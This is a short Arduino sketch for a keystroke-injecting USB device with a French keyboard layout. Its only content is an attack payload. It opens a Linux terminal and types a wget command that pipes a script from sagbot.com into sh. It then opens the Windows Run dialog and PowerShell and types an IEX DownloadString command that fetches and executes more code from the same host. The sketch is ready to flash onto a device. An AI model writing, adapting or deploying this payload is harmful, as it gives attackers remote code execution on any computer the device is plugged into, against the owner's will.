#include <Keyboard.h>

void setup(void) {
  Keyboard.begin(KeyboardLayout_fr_FR);

  // Start Payload
  delay(1000);

  // Press Ctrl + Alt + T
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(116);
  Keyboard.releaseAll();

  // Press Ctrl + Enter
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("wget sagbot.com/b -O - | sh --\n");

  // Press Command + R
  // Press Window + R
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(1000);
  
  Keyboard.print("powershell\n");
  
  delay(1000);

  Keyboard.print("IEX(New-Object Net.WebClient).DownloadString('https://sagbot.com/a')\n");
  // End Payload

  // Stop Keyboard and Mouse
  Keyboard.end();
}

// Unused
void loop(void) { }
